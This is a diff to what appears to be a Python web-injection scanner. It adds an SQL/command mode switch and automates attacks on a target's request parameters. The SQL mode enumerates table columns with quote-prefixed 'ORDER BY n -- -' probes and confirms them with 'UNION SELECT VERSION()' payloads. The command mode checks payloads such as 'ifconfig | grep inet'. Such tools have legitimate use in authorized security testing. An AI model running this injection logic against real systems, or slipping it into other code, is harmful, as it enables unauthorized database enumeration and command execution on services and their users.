@@ -4,6 +4,7 @@ import os
 from datetime import datetime
 import itertools
 import re
+import click
 
 def write_vulnerabilty_report(vulnerabilities_lines):
     directories, filename = os.path.split(VULNERABILITY_OUTPUT_PATH)
@@ -18,7 +19,16 @@ def write_vulnerabilty_report(vulnerabilities_lines):
 def elaborate_response(http_method, url_under_test, parameters_and_values, response, vulnerabilities_lines):
     url_under_test = url_under_test[1:] # remove initial slash
 
-    number_of_columns_not_found = True
+    if DEBUG:
+        print(f'\n[DEBUG] - URL: {url_under_test}')
+        print(f'[DEBUG] - HTTP METHOD: {http_method}')
+        print(f'[DEBUG] - COMPLETE URL: {response.url}')
+        print(f'[DEBUG] - PARAMETERS AND VALUES: {parameters_and_values}')
+        
+        print('[DEBUG] - RESPONSE')
+        print(response.text)
+
+    number_of_columns = None
 
     for parameter, value in parameters_and_values.items():
         message = f'Found a command injection for URL: {url_under_test}, HTTP method: {http_method}, parameter: {parameter}, payload: {value}'
@@ -26,16 +36,6 @@ def elaborate_response(http_method, url_under_test, parameters_and_values, respo
         # skip already checked combination
         if message in vulnerabilities_lines:
             continue
-
-        if DEBUG:
-            print(f'\n[DEBUG] - URL: {url_under_test}')
-            print(f'[DEBUG] - HTTP METHOD: {http_method}')
-            print(f'[DEBUG] - COMPLETE URL: {response.url}')
-            print(f'[DEBUG] - PARAMETER UNDER TEST: {parameter}')
-            print(f'[DEBUG] - PARAMETER UNDER TEST VALUE: {value}')
-            
-            print('[DEBUG] - RESPONSE')
-            print(response.text)
 
         vulnerable = False
 
@@ -55,18 +55,16 @@ def elaborate_response(http_method, url_under_test, parameters_and_values, respo
         elif 'ifconfig | grep inet' in value:
             if 'inet' in response.text:
                 vulnerable = True
-        elif re.findall(r'\'ORDER BY \d+ -- -', value): # if the text contais ORDER BY "number"
-            if not response.text: # response is empty if column number is out of range
-                columns_number = int(re.findall(r'\d+', value)[0])-1 # get correct columns number
-                message += f'. The table has {columns_number} column(s)'
-                vulnerable = True
-                number_of_columns_not_found = False
+        elif re.findall('[\'"1] ORDER BY \d+ -- -', value): # if the payload contais command to find the number of columns
+            if not response.text and 500 == response.status_code: # response is empty if column number is out of range
+                columns_number = int(re.findall('\d+', value)[-1])-1 # correct columns number = previous
+                return columns_number
 
         if vulnerable:
             print(message)
             vulnerabilities_lines.append(f'{datetime.now()} - {message}')
 
-    return number_of_columns_not_found
+    return number_of_columns
 
 # read requests details
 def read_requests_details(requests_dict):
@@ -99,7 +97,17 @@ def read_payloads(requests_dict):
         if i != len(requests_dict):
             raise IndexError()
 
-def send_request(requests_dict, vulnerabilities_lines):
+def send_request(request_details, data, final_url, vulnerabilities_lines):
+    if 'GET' == request_details['method'].upper():
+        return requests.get(final_url, params=data)
+    
+    if 'POST' == request_details['method'].upper():
+        return requests.post(final_url, data=data)
+
+    print(f'Method {request_details["method"]} is not supported. Check your input file')
+    raise ValueError 
+
+def prepare_data_and_send_request(requests_dict, vulnerabilities_lines, is_sql_run):
     for request in requests_dict:
         final_url = TARGET + request['url']
 
@@ -108,45 +116,133 @@ def send_request(requests_dict, vulnerabilities_lines):
             for _ in range(len(request['parameters']) - len(request['payloads'])):
                 request['payloads'].append('valid_string')
 
-        # permutations of payloads based on parameters length
-        for payload in list(itertools.permutations(request['payloads'], len(request['parameters']))):
-            data = { }
+        # set current ORDER BY value
+        current_column_number = 1
 
-            more_requests_for_columns_number = False
+        pre_order_by_values = ['\'', '"', '1']
 
-            # to inject different ORDER BY values
-            if COMMAND_COLUMNS_NUMBER in request['payloads']:
-                more_requests_for_columns_number = True
+        while True:
+            end_loop = False
 
-            for i in range(len(request['parameters'])):
-                if more_requests_for_columns_number:
-                    data[request['parameters'][i]] = '\'ORDER BY 1 -- -' if COMMAND_COLUMNS_NUMBER == payload[i] else payload[i]
-                else:
-                    data[request['parameters'][i]] = payload[i]
-                
-            # set current ORDER BY value
-            i = 1
+            noc_command_in_payloads = COMMAND_COLUMNS_NUMBER in request['payloads']
+            
+            # permutations of payloads based on parameters length
+            for payload in list(itertools.permutations(request['payloads'], len(request['parameters']))):
+                # if payload contains the command to find the number of columns and the run is set to sql mode 
+                if noc_command_in_payloads and is_sql_run:
+                    for pre_order_by_value in pre_order_by_values[:]: # loop over a copy of the list because elements can be removed
+                        data = { }
+                        
+                        for i in range(len(request['parameters'])):
+                            if COMMAND_COLUMNS_NUMBER == payload[i]:
+                                data[request['parameters'][i]] = f'{pre_order_by_value} ORDER BY {current_column_number} -- -'
+                            else:
+                                data[request['parameters'][i]] = payload[i]
 
-            while True:
-                if 'GET' == request['method'].upper():
-                    more_requests_for_columns_number = elaborate_response(request['method'], request['url'], data, requests.get(final_url, params=data), vulnerabilities_lines)
-                elif 'POST' == request['method'].upper():
-                    more_requests_for_columns_number = elaborate_response(request['method'], request['url'], data, requests.post(final_url, data=data), vulnerabilities_lines)
-                else:
-                    print(f'Method {request["method"]} is not supported. Check your input file')
-                    raise ValueError 
+                        response = send_request(request, data, final_url, vulnerabilities_lines)
 
-                # found number of columns or the ORDER BY command is not related to --noc command
-                if not more_requests_for_columns_number or COMMAND_COLUMNS_NUMBER not in request['payloads']:
+                        if 404 == response.status_code:
+                            if DEBUG:
+                                print(f'[DEBUG] - RESOURCE NOT FOUND: {request["url"]}')
+                                end_loop = True
+                                break
+
+                        number_of_columns = elaborate_response(request['method'], request['url'], data, response, vulnerabilities_lines)
+
+                        # type or quotes error
+                        if 0 == number_of_columns:
+                            pre_order_by_values.remove(pre_order_by_value) # remove invalid char
+                        elif number_of_columns: # if the number of columns is found, send a confirmation request
+                            columns_values = [f'VERSION()']
+
+                            for i in range(1, number_of_columns):
+                                columns_values.append(i)
+
+                            for column_value in list(itertools.permutations(columns_values)):
+                                confirmation_query = 'UNION SELECT '
+
+                                for column_val in column_value:
+                                    confirmation_query += f'{column_val}, '
+                            
+                                confirmation_query = confirmation_query[:-2] # remove extra chars
+
+                                confirmation_data = { }
+                            
+                                for i in range(len(request['parameters'])):
+                                    if COMMAND_COLUMNS_NUMBER == payload[i]:
+                                        confirmation_data[request['parameters'][i]] = f'{pre_order_by_value} {confirmation_query} -- -'
+                                    else:
+                                        confirmation_data[request['parameters'][i]] = payload[i]
+
+                                response = send_request(request, confirmation_data, final_url, vulnerabilities_lines)
+
+                                if re.findall('\d.\d.[\d.]+', response.text): # check if the response contains a version format string
+                                    url_under_test = request['url'][1:] # remove initial slash
+
+                                    if DEBUG:
+                                        print('[DEBUG] - STARTING VULNERABILITY CONFIRMATION')
+                                        print(f'[DEBUG] - URL: {url_under_test}')
+                                        print(f'[DEBUG] - HTTP METHOD: {request["method"]}')
+                                        print(f'[DEBUG] - COMPLETE URL: {response.url}')
+                                        print(f'[DEBUG] - PARAMETERS AND VALUES: {confirmation_data}')
+                                        
+                                        print('[DEBUG] - RESPONSE')
+                                        print(response.text)
+
+                                    # loop over previous request data
+                                    for parameter, value in data.items():
+                                        if not re.findall('[\'"1] ORDER BY \d+ -- -', value):
+                                            continue
+
+                                        message = f'Found a command injection for URL: {request["url"][1:]}, HTTP method: {request["method"]}, parameter: {parameter}, payload: {value}. The table has {number_of_columns} column(s)'
+
+                                        # skip already checked combination
+                                        if message in vulnerabilities_lines:
+                                            continue
+
+                                        print(message)
+                                        vulnerabilities_lines.append(f'{datetime.now()} - {message}')
+
+                                    end_loop = True
+
+                                    if DEBUG:
+                                        print('[DEBUG] - VULNERABILITY CONFIRMATION FINISHED')
+
+                                if end_loop:
+                                    break
+                            
+                        # found and confirmed number of columns
+                        if end_loop:
+                            break
+                else: # simply inject commands
+                    data = { }
+                    
+                    for i in range(len(request['parameters'])):
+                        data[request['parameters'][i]] = payload[i]
+                    
+                    response = send_request(request, data, final_url, vulnerabilities_lines)
+
+                    end_loop = True
+
+                    if 404 == response.status_code:
+                        if DEBUG:
+                            print(f'[DEBUG] - RESOURCE NOT FOUND: {request["url"]}')
+                            break
+                    
+                    elaborate_response(request['method'], request['url'], data, response, vulnerabilities_lines)
+
+                if end_loop:
                     break
 
-                i += 1
+            # found and confirmed number of columns
+            if end_loop or not noc_command_in_payloads:
+                break
 
-                for parameter, value in data.items():
-                    if re.findall(r'\'ORDER BY \d+ -- -', value):
-                        data[parameter] = f'\'ORDER BY {i} -- -'
+            current_column_number += 1
 
-def main():
+@click.command()
+@click.option('--mode', '-m', help='Injection mode [sql, cmd]', type=click.Choice(['sql', 'cmd']), required=True)
+def main(mode):
     requests_dict = [ ]
 
     read_requests_details(requests_dict)
@@ -160,7 +256,7 @@ def main():
 
         vulnerabilities_lines = [ ]
 
-        send_request(requests_dict, vulnerabilities_lines)
+        prepare_data_and_send_request(requests_dict, vulnerabilities_lines, 'sql' == mode)
         write_vulnerabilty_report(vulnerabilities_lines)
     except ValueError:
         exit()
